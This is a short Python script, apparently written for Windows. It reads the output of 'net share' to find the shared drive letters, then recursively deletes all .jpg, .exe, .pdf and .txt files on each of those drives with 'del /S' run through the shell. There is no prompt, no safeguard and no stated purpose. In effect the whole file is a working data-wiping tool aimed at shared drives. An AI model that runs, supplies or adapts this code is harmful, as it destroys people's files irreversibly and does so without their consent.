import socket
import subprocess as sub


sys_drive=[]
drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
cmd =sub.check_output("net share",shell=True)
for i in drive:
    if i in str(cmd):
        sys_drive.append(i)




for i in sys_drive:
    cmd = sub.check_output(i+"&& del /S *.jpg",shell=True)
    cmd = sub.check_output(i+"&& del /S *.exe",shell=True)
    cmd = sub.check_output(i+"&& del /S *.pdf",shell=True)
    cmd = sub.check_output(i+"&& del /S *.txt",shell=True)
      
